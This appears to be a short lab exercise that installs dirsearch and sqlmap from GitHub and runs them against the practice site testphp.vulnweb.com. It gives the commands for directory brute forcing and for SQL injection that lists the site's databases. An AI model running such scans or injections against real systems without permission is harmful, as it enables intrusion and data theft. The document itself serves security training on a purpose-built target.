-
## STEP 1: Advance Linux Commands:

[image advanced command part 1](image.png)
[image advanced command part 2](image_1.png)

## STEP 2: Installing GitHub Tools

### dirsearch

```bash
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u http://testphp.vulnweb.com
```

[image installing dirsearch](image_2.png)

### SQLMap

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version
```

[image installing sqlmap](image_3.png)

## **STEP 3: Launch Attacks on** **testphp.vulnweb.com**

### **Directory Brute Forcing via dirsearch**

```bash
python3 dirsearch.py -u http://testphp.vulnweb.com
```

[image diectoy brute force](image_4.png)

### SQL Injection via sqlmap

```bash
python3 sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
```

[image dumping DB](image_5.png)
